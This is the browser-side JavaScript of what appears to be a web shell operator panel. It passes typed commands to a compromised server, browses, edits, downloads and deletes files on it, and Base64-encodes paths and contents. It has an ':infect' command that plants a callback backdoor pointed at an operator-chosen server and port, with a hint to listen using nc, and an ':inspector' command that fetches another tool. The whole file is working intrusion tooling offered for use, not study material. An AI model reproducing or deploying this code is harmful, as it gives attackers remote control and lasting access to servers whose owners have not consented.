<script>
function directory_shower(){
    $('.directory').click(function(){
        var directory = $(this).html();
        $.post(original, {directory: current, new:directory}, function(data){
            current = data;
            $.post(original, {explorer:"1", pwd:current}, function(data){
                $('.containerExplorer').html(data);
                    directory_shower();
                    file_viewer();
                })
                $('label').html(current + " > ");
            })
        })
}

function close(){
    $('#close').click(function(){
        $('.fileview').animate({
            opacity: 0
        }, 1000, function(){
            $('.fileview').css('display', 'none');
            $('.explorerHead').html(current);
            $('.explorer').css('display', 'block');
                            $('.explorer').animate({
                                opacity: 1
                            }, 1000, function(){
                                $.post(original, {explorer:"1", pwd:current}, function(data){
                                    $('.containerExplorer').html(data);
                                    directory_shower();
                                    file_viewer();
                                });
                            });
        })
    });
}

function download(){
    $('#download').click(function(){
        var string = current + "/" + current_file;
        document.location.href = original + "?download=" + Base64.encode(string);
    });
}    

function editFile(){
    $('#editFile').click(function(){
        var string = current + "/" + current_file;
        var update = $('.contentf').html();
        string = Base64.encode(string);
        update = Base64.encode(update);
        $.post(original, {updateFile: string, update: update}, function(data){
            if(data == "ok"){
                alert('file '+current_file+' updated');
            }
            else{
                alert ("can't update "+current_file);
            }
        })
    });
}
    
function deleteFile(){
    $('#deleteFile').click(function(){
        var string = current + "/" + current_file;
        $.post(original, {deletefile: string}, function(data){
            if(data == 'ok'){
               alert('file deleted');
            }
            else{
                alert("Error can't delete");
            }
        })
    })
}

function file_viewer(){
    $('.file').click(function(){
        var file = $(this).html();
        var string = current + "/" + file;
        $.post(original, {viewfile:string}, function(data){
           if(data != "no"){
               current_file = file;
               $('.explorer').animate({
                   opacity: 0
               }, 1000, function(){
                   $('.explorer').css('display', 'none');
                   $('.fileview').css('display', 'block');
                   $('.fileview').animate({
                       opacity: 1
                   }, 1000, function(){
                       $('.fileHead').html(string);
                       $('.contentf').html(data);
                       close();
                       download();
                       deleteFile();
                       editFile();
                   })
               })
           } 
        });
    });
}
var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}

var current_file = "";
document.getElementById('command').addEventListener('keydown', function(e) {
    var element = document.getElementById('command');
    if(e.keyCode == 13){
        var value = this.value;
        e.preventDefault();
        element.value = "";
        if(value == "clear"){
            $('.container-terminal').html('');
        }
        else if(value == ":infect"){
            if(confirm('Install monitor here '+current+' ?')){
                var server = prompt('server for ping?');
                var port = prompt('port ?');
                var string = server+":"+port;
                $.post(original, {infect:string,infectdir:current}, function(data){
                    if(data == "ok"){
                        $('.container-terminal').append('<p class="information">We pinged all Hours if backdoor deleted please nc -l '+port+'</p>');
                    }
                    else{
                        alert('error');
                    }
                })
            }
        }
        else if(value == ":inspector"){
            $.post(original, {inspector: current}, function(data){
                if(data == "ok"){
                    $('.container-terminal').append('<p class="information">Inspector downloaded !</p>');
                }
                else
                {
                    $('.container-terminal').append('<p class="error">Error on download.</p>');
                }
            })
        }
        else if(value == ":explorer"){
            $('.explorerHead').html(current);
            $('.container-terminal').animate({
                height: '0%'
            }, 1000, function(){
                $('.explorer').css('display', 'block');
                $('.explorer').animate({
                    opacity: 1
                }, 1000, function(){
                    $.post(original, {explorer:"1", pwd:current}, function(data){
                        $('.containerExplorer').html(data);
                        directory_shower();
                        file_viewer();
                    });
                });
            })
        }
        else if(value == ':show'){
            $('.explorer').animate({
                opacity: 0
            }, 1000, function(){
                $('.explorer').css('display', 'none');
                $('.container-terminal').animate({
                    height: '40%'
                }, 1000)
            })
        }
        else if(value == "help"){
            var help = ""
        }
        $.post(original, {terminal_query: value}, function(data){
            var old = $('.container-terminal').html();
            $('.container-terminal').html(old + data);
        });
        
    }
    $('label').html(current + " > ");
}, false);
$(document).ready(function(){
    $('label').html(current + " > ");
    if($('.container-terminal').html() == ''){
        $('.container-terminal').html('<p class="information">You can use :help</p>');
    }
})
</script>